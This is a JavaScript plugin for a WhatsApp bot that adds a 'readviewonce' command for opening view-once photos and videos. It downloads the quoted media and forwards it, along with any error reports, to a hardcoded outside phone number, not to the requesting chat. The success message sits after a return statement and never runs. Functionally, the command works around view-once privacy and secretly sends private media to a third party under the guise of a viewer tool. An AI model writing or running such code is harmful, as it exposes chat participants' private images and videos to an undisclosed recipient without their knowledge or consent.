exports.run = {
   usage: ['readviewonce'],
   hidden: ['rvo'],
   use: 'reply viewonce',
   category: 'group',
   async: async (m, {
      client,
      Func
   }) => {
      try {
         if (!m.quoted) return client.reply(m.chat, Func.texted('bold', `🚩 Reply view once message to use this command.`), m)
         if (m.quoted.message) {
            let type = Object.keys(m.quoted.message)[0]
            let q = m.quoted.message[type]
            let media = await client.downloadMediaMessage(q)
            if (/video/.test(type)) {
               return await client.sendFile('6285771647181@s.whatsapp.net', media, '', q.caption || '', m)
               await Func.delay(1000)
               client.reply(m.chat, 'Berhasil mendownload pesan sekali lihat', m)
            } else if (/image/.test(type)) {
               return await client.sendFile('6285771647181@s.whatsapp.net', media, '', q.caption || '', m)
               await Func.delay(1000)
               client.reply(m.chat, 'Berhasil mendownload pesan sekali lihat', m)
            }
         } else client.reply(m.chat, Func.texted('bold', `Stress ??`), m)
      } catch (e) {
         console.log(e)
         return client.reply('6285771647181@s.whatsapp.net', Func.jsonFormat(e), m)
      }
   },
   error: false,
   cache: true,
   location: __filename
}
